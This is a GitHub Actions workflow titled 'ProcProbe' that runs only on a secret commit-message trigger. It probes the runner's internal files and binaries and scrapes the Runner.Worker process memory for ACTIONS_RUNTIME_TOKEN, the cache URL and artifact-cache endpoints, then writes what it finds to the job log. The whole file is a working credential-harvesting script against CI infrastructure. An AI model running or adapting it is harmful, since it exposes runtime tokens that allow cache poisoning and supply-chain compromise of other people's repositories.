name: ProcProbe
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    if: contains(github.event.head_commit.message, 'PROC-V3')
    steps:
      - name: Deep runner process investigation
        run: |
          WORKER_PID=$PPID
          echo "=== RUNNER.WORKER PID: $WORKER_PID ==="
          echo ""
          echo "=== PIPELINE FOLDER JSON ==="
          cat /home/runner/work/_PipelineMapping/*/PipelineFolder.json 2>/dev/null || echo "not found"
          echo ""
          echo "=== RUNNER WORK TEMP DIR ==="
          ls -la /home/runner/work/_temp/ 2>/dev/null | head -20
          find /home/runner/work/_temp/ -type f -name "*.json" 2>/dev/null | head -10
          echo ""
          echo "=== EVENT JSON ==="
          cat /home/runner/work/_temp/_github_workflow/event.json 2>/dev/null | python3 -m json.tool | head -30 || echo "not found"
          echo ""
          echo "=== RUNNER CONFIG FILES ==="
          ls -la /home/runner/actions-runner/ 2>/dev/null | head -20
          find /home/runner/actions-runner -name "*.json" -not -path "*/cached/*" 2>/dev/null | head -10
          echo ""
          echo "=== RUNNER.WORKER MAPS (memory regions) ==="
          cat /proc/$WORKER_PID/maps 2>/dev/null | grep -v "\.so\|kworker" | head -20
          echo ""
          echo "=== PROVJOBD BINARY INFO ==="
          ls -la /tmp/provjobd* 2>/dev/null
          file /tmp/provjobd* 2>/dev/null
          strings /tmp/provjobd* 2>/dev/null | grep -i "token\|secret\|key\|runtime\|cache" | head -20
          echo ""
          echo "=== HCA BINARY ==="
          ls -la /opt/hca/ 2>/dev/null
          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -i "token\|secret\|runtime\|cache" | head -20
          echo ""
          echo "=== RUNNER.WORKER READABLE MEMORY SEGMENTS ==="
          python3 -c "
import re, sys
maps_file = '/proc/$WORKER_PID/maps'
mem_file = '/proc/$WORKER_PID/mem'
with open(maps_file, 'r') as f:
    maps = f.readlines()
results = []
try:
    with open(mem_file, 'rb') as f:
        for line in maps[:50]:
            parts = line.split()
            if len(parts) < 2: continue
            perms = parts[1]
            if 'r' not in perms: continue
            addr_range = parts[0].split('-')
            start = int(addr_range[0], 16)
            end = int(addr_range[1], 16)
            size = end - start
            if size > 50*1024*1024: continue  # skip huge mappings
            try:
                f.seek(start)
                data = f.read(size)
                for kw in [b'ACTIONS_RUNTIME_TOKEN', b'ACTIONS_CACHE_URL', b'_apis/artifactcache']:
                    idx = data.find(kw)
                    if idx >= 0:
                        print(f'FOUND {kw.decode()} in {parts[0]}:')
                        print(data[max(0,idx-10):idx+200].decode('utf-8', errors='replace'))
                        print()
            except: pass
except Exception as e:
    print('Memory read error:', e)
print('Memory scan done')
" 2>/dev/null
